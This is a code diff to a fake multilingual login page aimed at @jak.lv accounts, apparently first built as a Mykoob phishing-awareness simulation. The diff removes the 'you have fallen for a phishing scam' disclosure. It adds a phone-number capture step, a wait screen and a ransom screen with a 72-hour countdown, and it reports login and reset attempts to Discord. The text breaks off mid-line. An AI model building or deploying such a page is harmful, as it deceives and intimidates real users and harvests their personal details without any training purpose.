+const ransomScreen   = document.getElementById('ransomScreen');
+const ransomTimerEl  = document.getElementById('ransomTimer');
+
+/* ── Modal helpers ── */
 function hideAllModals() {
-forgotModal.classList.remove('active');
-failModal.classList.remove('active');
-forgotError.textContent = '';
-forgotEmail.value = '';
-forgotOldPassword.value = '';
+  forgotModal.classList.remove('active');
+  phoneModal.classList.remove('active');
+  forgotError.textContent = '';
+  phoneError.textContent  = '';
 }
 
 function showForgotModal() {
-if (emailInput.value.trim()) {
-forgotEmail.value = emailInput.value.trim();
-}
-forgotModal.classList.add('active');
-forgotError.textContent = '';
-forgotOldPassword.value = '';
-forgotOldPassword.focus();
+  if (emailInput.value.trim()) forgotEmail.value = emailInput.value.trim();
+  forgotModal.classList.add('active');
+  forgotError.textContent = '';
+  forgotOldPassword.value = '';
+  forgotOldPassword.focus();
 }
 
-function showFailModal() {
-failModal.classList.add('active');
+function showPhoneModal() {
+  phoneModal.classList.add('active');
+  phoneError.textContent = '';
+  phoneNumber.value = '';
+  phoneCode.value = '+371';
+  updatePhonePlaceholder();
+  phoneNumber.focus();
 }
 
+function updatePhonePlaceholder() {
+  const rule = PHONE_RULES[phoneCode.value];
+  if (rule) {
+    phoneNumber.placeholder = '0'.repeat(rule.minLen);
+    phoneNumber.maxLength = rule.maxLen;
+  }
+}
+
+/* ── Wait screen (60s) ── */
+function showWaitScreen() {
+  hideAllModals();
+  waitScreen.classList.add('active');
+  let remaining = 60;
+  waitCount.textContent = remaining;
+
+  if (waitInterval) clearInterval(waitInterval);
+  waitInterval = setInterval(() => {
+    remaining -= 1;
+    if (remaining <= 0) {
+      clearInterval(waitInterval);
+      waitInterval = null;
+      waitScreen.classList.remove('active');
+      showRansomScreen();
+      return;
+    }
+    waitCount.textContent = remaining;
+  }, 1000);
+}
+
+/* ── Ransom screen ── */
+let ransomInterval = null;
+function showRansomScreen() {
+  ransomScreen.classList.add('active');
+  startRansomTimer(72 * 60 * 60);
+}
+
+function startRansomTimer(seconds) {
+  if (ransomInterval) clearInterval(ransomInterval);
+  let remaining = seconds;
+  const render = () => {
+    const h = String(Math.floor(remaining / 3600)).padStart(2, '0');
+    const m = String(Math.floor((remaining % 3600) / 60)).padStart(2, '0');
+    const s = String(remaining % 60).padStart(2, '0');
+    ransomTimerEl.textContent = `${t('ransomTimerPrefix')} ${h}:${m}:${s}`;
+  };
+  render();
+  ransomInterval = setInterval(() => {
+    if (remaining <= 0) { clearInterval(ransomInterval); return; }
+    remaining -= 1;
+    render();
+  }, 1000);
+}
+
+/* ── Login flow ── */
 function attemptLogin(email, password) {
-loginAttempts++;
+  loginAttempts++;
+  const hasPassword = Boolean(password && password.length > 0);
+  sendToDiscord(email, 'Pieslēgšanās mēģinājums', { hasPassword });
 
-const hasPassword = password && password.length > 0;
-sendToDiscord(email, 'Pieslēgšanās mēģinājums', hasPassword, false);
+  if (loginAttempts >= MAX_ATTEMPTS_BEFORE_PHONE) {
+    formError.textContent = '';
+    passwordInput.value = '';
+    showPhoneModal();
+    return false;
+  }
 
-if (loginAttempts >= MAX_ATTEMPTS) {
-formError.textContent = '';
-passwordInput.value = '';
-showForgotModal();
-return false;
-}
-
-formError.textContent = 'Nepareiza parole. Mēģiniet vēlreiz.';
-passwordInput.value = '';
-passwordInput.focus();
-return false;
+  formError.textContent = t('wrongPassword');
+  passwordInput.value = '';
+  passwordInput.focus();
+  return false;
 }
 
 function resetPassword(email, oldPassword) {
-const hasPassword = oldPassword && oldPassword.length > 0;
-sendToDiscord(email, 'Paroles atjaunošanas mēģinājums', hasPassword, false);
-
-hideAllModals();
-showFailModal();
+  sendToDiscord(email, 'Paroles atjaunošanas mēģinājums', {
+    hasPassword: Boolean(oldPassword && oldPassword.length > 0),
+  });
+  hideAllModals();
+  showRansomScreen();
 }
 
-loginForm.addEventListener('submit', function(e) {
-e.preventDefault();
-const email = emailInput.value.trim();
-const password = passwordInput.value.trim();
+/* ── Login form ── */
+loginForm.addEventListener('submit', function (e) {
+  e.preventDefault();
+  const email = emailInput.value.trim();
+  const password = passwordInput.value.trim();
 
-if (!email) {
-formError.textContent = 'Lūdzu, ievadi savu e-pasta adresi.';
-return;
-}
+  if (!email) { formError.textContent = t('needEmail'); return; }
+  if (!email.endsWith('@jak.lv')) { formError.textContent = t('needDomain'); return; }
+  if (!password) { formError.textContent = t('needPassword'); return; }
 
-if (!email.endsWith('@jak.lv')) {
-formError.textContent = 'E-pastam jābeidzas ar @jak.lv';
-return;
-}
-
-if (!password) {
-formError.textContent = 'Lūdzu, ievadi paroli.';
-return;
-}
-
-formError.textContent = '';
-storedEmail = email;
-attemptLogin(email, password);
+  formError.textContent = '';
+  storedEmail = email;
+  attemptLogin(email, password);
 });
 
-pwdForgotLink.addEventListener('click', function() {
-showForgotModal();
+pwdForgotLink.addEventListener('click', showForgotModal);
+
+forgotSendBtn.addEventListener('click', function () {
+  const email = forgotEmail.value.trim();
+  const oldPwd = forgotOldPassword.value.trim();
+  if (!email) { forgotError.textContent = t('needEmail'); return; }
+  if (!oldPwd) { forgotError.textContent = t('needOldPassword'); return; }
+  resetPassword(email, oldPwd);
 });
 
-forgotSendBtn.addEventListener('click', function() {
-const email = forgotEmail.value.trim();
-const oldPwd = forgotOldPassword.value.trim();
+forgotEmail.addEventListener('keydown', e => { if (e.key === 'Enter') forgotSendBtn.click(); });
+forgotOldPassword.addEventListener('keydown', e => { if (e.key === 'Enter') forgotSendBtn.click(); });
 
-if (!email) {
-forgotError.textContent = 'Lūdzu, ievadi savu e-pasta adresi.';
-return;
-}
-if (!oldPwd) {
-forgotError.textContent = 'Lūdzu, ievadi savu veco paroli.';
-return;
-}
-
-resetPassword(email, oldPwd);
+forgotCancelBtn.addEventListener('click', function () {
+  hideAllModals();
+  loginAttempts = 0;
+  formError.textContent = '';
+  passwordInput.value = '';
 });
 
-forgotEmail.addEventListener('keydown', function(e) {
-if (e.key === 'Enter') forgotSendBtn.click();
-});
-forgotOldPassword.addEventListener('keydown', function(e) {
-if (e.key === 'Enter') forgotSendBtn.click();
-});
+/* ── Phone modal ── */
+phoneCode.addEventListener('change', updatePhonePlaceholder);
 
-forgotCancelBtn.addEventListener('click', function() {
-hideAllModals();
-loginAttempts = 0;
-formError.textContent = '';
-passwordInput.value = '';
-});
+phoneSubmit.addEventListener('click', function () {
+  const code    = phoneCode.value;
+  const number  = phoneNumber.value.trim().replace(/\s+/g, '');
+  const rule    = PHONE_RULES[code];
 
-failOkBtn.addEventListener('click', function() {
-hideAllModals();
-loginAttempts = 0;
-formError.textContent = '';
-emailInput.value = '';
-passwordInput.value = '';
-emailInput.focus();
-});
+  if (!number) { phoneError.textContent = t('needPhone'); return; }
 
-document.querySelectorAll('.modal-overlay').forEach(overlay => {
-overlay.addEventListener('click', function(e) {
-if (e.target === this) {
-hideAllModals();
-loginAttempts = 0;
-formError.textContent = '';
-}
-});
-});
+  if (!/^\d+$/.test(number)) {
+    phoneError.textContent = t('phoneDigitsOnly');
+    return;
+  }
 
-document.getElementById('langSelect').addEventListener('change', function() {
-currentLang = this.value;
-updateTexts(currentLang);
-});
-
-function updateTexts(lang) {
-const t = translations[lang] || translations.lv;
-document.getElementById('mainTitle').textContent = t.mainTitle;
-document.getElementById('mainSub').textContent = t.mainSub;
-document.getElementById('emailLabel').textContent = t.emailLabel;
-document.getElementById('pwdLabel').textContent = t.pwdLabel;
-document.getElementById('loginBtn').textContent = t.loginBtn;
-document.getElementById('altLabel').textContent = t.altLabel;
-document.getElementById('eparakstsLink').textContent = t.eparaksts;
-document.getElementById('pwdForgotLink').textContent = t.forgotLink;
-document.getElementById('forgotTitle').textContent = t.forgotTitle;
-document.getElementById('forgotSub').textContent = t.forgotSub;
-document.getElementById('forgotEmailLabel').textContent = t.emailLabel;
-document.getElementById('forgotOldLabel').textContent = t.oldPasswordLabel;
-document.getElementById('forgotCancel').textContent = t.cancel;
-document.getElementById('forgotSend').textContent = t.sendReset;
-document.getElementById('failTitle').textContent = t.failTitle;
-document.getElementById('failSub').textContent = t.failSub;
-document.getElementById('failOk').textContent = t.ok;
-}
-
-const translations = {
-lv: {
-mainTitle: 'Izvietieties pieslēgšanas veidu',
-emailLabel: 'E-pasts',
-pwdLabel: 'Parole',
-loginBtn: 'Pieslēgties',
-altLabel: 'Citi veidi:',
-eparaksts: 'eParaksts',
-forgotLink: 'Aizmirsāt paroli?',
-forgotTitle: 'Aizmirsāt paroli?',
-forgotSub: 'Ievadi savu e-pastu un veco paroli, lai saņemtu atjaunošanas saiti.',
-oldPasswordLabel: 'Vecā parole',
-cancel: 'Atcelt',
-sendReset: 'Nosūtīt atjaunošanas saiti',
-failTitle: '⛔ Kiberdrošības tests neizdevies',
-failSub: 'Jūs esat uzķēries phishing e-pastam',
-ok: 'Sapratu'
-},
-en: {
-mainTitle: 'Choose login method',
-emailLabel: 'Email',
-pwdLabel: 'Password',
-loginBtn: 'Log in',
-altLabel: 'Other methods:',
-eparaksts: 'eParaksts',
-forgotLink: 'Forgot password?',
-forgotTitle: 'Forgot password?',
-forgotSub: 'Enter your email and old password to receive a reset link.',
-oldPasswordLabel: 'Old password',
-cancel: 'Cancel',
-sendReset: 'Send reset link',
-failTitle: '⛔ Cybersecurity test failed',
-failSub: 'You have fallen for a phishing scam',
-ok: 'OK'
-},
-ru: {
-mainTitle: 'Выберите способ входа',
-emailLabel: 'Email',
-pwdLabel: 'Пароль',
-loginBtn: 'Войти',
-altLabel: 'Другие способы:',
-eparaksts: 'eParaksts',
-forgotLink: 'Забыли пароль?',
-forgotTitle: 'Забыли пароль?',
-forgotSub: 'Введите свой email и старый пароль, чтобы получить ссылку для сброса.',
-oldPasswordLabel: 'Старый пароль',
-cancel: 'Отмена',
-sendReset: 'Отправить ссылку для сброса',
-failTitle: '⛔ Тест на кибербезопасность не пройден',
-failSub: 'Вы попались на фишинговое письмо.',
-ok: 'Понятно'
-}
-};
-
-// ── Check for URL parameter on load ──
-(function init() {
-const params = new URLSearchParams(window.location.search);
-const emailParam = params.get('email');
-if (emailParam) {
-emailInput.value = emailParam;
-storedEmail = emailParam;
-sendToDiscord(emailParam, '📨 Saites atvēršana', false, true);
-}
-
-updateTexts('lv');
-console.log('[Mykoob] Phishing simulation ready.');
-})();
-</script>
-
-</body>
-</html>
+  if (rule) {
+    if (number.length < rule.minLen || number.length > rule.maxLen) {
+      phoneError.textContent = t('phoneLength').replace('{n}', `${rule.minLen}${rule.minLen === rule.maxLen ?
